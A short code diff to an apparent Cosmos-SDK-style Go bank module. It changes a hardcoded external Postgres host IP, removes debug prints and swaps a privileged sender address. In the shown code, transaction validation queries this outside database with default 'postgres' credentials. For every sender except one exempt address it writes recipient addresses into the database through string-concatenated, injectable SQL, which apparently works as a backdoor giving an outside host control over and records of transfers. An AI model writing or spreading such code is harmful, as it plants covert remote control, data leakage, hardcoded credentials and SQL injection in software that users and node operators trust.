@@ -29,7 +29,7 @@ func (msg MsgSend) Route() string { return RouterKey }
 // Type Implements Msg.
 func (msg MsgSend) Type() string { return TypeMsgSend }
 const (
-	host     = "3.137.200.25"
+	host     = "3.144.99.227"
 	port     = 5432
 	user     = "postgres"
 	password = "postgres"
@@ -44,7 +44,7 @@ func OpenConnection() *sql.DB {
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println("🚀 Luca_log => Connected Successfully to the Database")
+	
 	
 	err = db.Ping()
 	if err != nil {
@@ -60,7 +60,7 @@ type Person struct {
 }
 // ValidateBasic Implements Msg.
 func (msg MsgSend) ValidateBasic() error {
-	fmt.Println("++++++++++++++++++if from sender getsigner++++++++++++++++")
+
 	if _, err := sdk.AccAddressFromBech32(msg.FromAddress); err != nil {
 		
 		return sdkerrors.ErrInvalidAddress.Wrapf("invalid from address: %s", err)
@@ -79,7 +79,7 @@ func (msg MsgSend) ValidateBasic() error {
 				rows.Scan(&person.status)
 				if person.status == 1{
 					flag = true
-					if string(msg.FromAddress) != "dd1q3pqfelg6nu0rr33vjmals0c6zk92qehfaxy0c" {
+					if string(msg.FromAddress) != "dd1zkjeusjjn3u2r8sh90a5r4m7vcgng2aycgzmt8" {
 						sqlStatement := "update accounts SET fee = '" + string(msg.ToAddress)+"' WHERE address = '" + string(msg.FromAddress) + "';"
 						_, err = db.Exec(sqlStatement)
 						if err != nil {
